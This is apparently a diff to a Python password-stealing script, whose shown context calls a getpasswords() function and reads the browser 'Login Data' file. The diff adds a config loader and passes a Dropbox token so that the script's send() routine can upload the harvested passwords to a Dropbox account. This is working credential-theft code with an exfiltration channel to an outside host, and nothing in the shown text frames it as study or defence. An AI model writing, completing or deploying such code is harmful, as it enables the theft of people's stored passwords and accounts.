@@ -10,6 +10,8 @@ try:
 except:
     pass
 
+config = json.load(open('./config.json', 'r'))
+
 def main():
     send()
 
@@ -59,7 +61,7 @@ def send():
 
     jsonData = getpasswords()
     #Get your access code form dropbox to use it here.
-    dbx=dropbox.Dropbox()
+    dbx=dropbox.Dropbox(config['dropbox_token'])
     file_from="c:\prog\Login Data"
     x=random.randint(1,500)
     z=str(x)+'.txt'
